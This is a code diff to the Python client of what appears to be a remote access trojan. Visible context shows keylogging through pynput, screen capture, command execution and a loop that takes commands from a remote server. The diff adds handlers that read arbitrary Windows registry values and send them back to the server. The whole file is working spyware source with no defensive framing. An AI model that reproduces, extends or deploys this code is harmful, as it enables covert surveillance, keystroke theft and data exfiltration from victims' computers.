@@ -4,9 +4,9 @@ from boltons import socketutils
 from pynput import keyboard
 from PIL import ImageGrab
 import os
-import wmi
 import threading
 import subprocess
+from winreg import *
 
 SERVER = ""
 PORT = 1234
@@ -112,6 +112,10 @@ class Client:
                     self.getCommand()
                 elif flag == 'keylogger':
                     self.keylogger_Server()
+                elif flag == 'regfile':
+                    self.getRegFile()
+                elif flag == 'reggetval':
+                    self.sendRegVal()
                 elif flag == 'close':
                     self.closeConnection()
             except:
@@ -237,7 +241,52 @@ class Client:
                     listener.stop()
                 break
             
+    def getRegFile(self):
+        data = self.buff.recv_until(self.DELIM).decode()
+        print(data)
 
-    
+        self.buff.send('OK'.encode() + self.DELIM)
+
+    def sendRegVal(self):
+        path = self.buff.recv_until(self.DELIM).decode()
+        value = self.buff.recv_until(self.DELIM).decode()
+
+        hkey, key = path.split('\\', 1)
+        
+        result = QueryValueEx(OpenKeyEx(getHKEY(hkey), key), value)
+        self.sendDump(result)
+        
+
+        
+
+def getHKEY(name):
+    if name == "HKEY_CLASSES_ROOT":
+        return HKEY_CLASSES_ROOT
+    elif name == "HKEY_CURRENT_USER":
+        return HKEY_CURRENT_USER
+    elif name == "HKEY_LOCAL_MACHINE":
+        return HKEY_LOCAL_MACHINE
+    elif name == "HKEY_USERS":
+        return HKEY_USERS
+    elif name == 'HKEY_PERFORMANCE_DATA':
+        return HKEY_PERFORMANCE_DATA
+    elif name == 'HKEY_CURRENT_CONFIG':
+        return HKEY_CURRENT_CONFIG
+    elif name == 'HKEY_DYN_DATA':
+        return HKEY_DYN_DATA
+
+def getType(type):
+    if type == 'String':
+        return REG_SZ
+    elif type == 'Binary':
+        return REG_BINARY
+    elif type == 'DWORD':
+        return REG_DWORD
+    elif type == 'QWORD':
+        return REG_QWORD
+    elif type == 'Multi-String':
+        return REG_MULTI_SZ
+    elif type == 'Expandable String':
+        return REG_EXPAND_SZ 
 
 
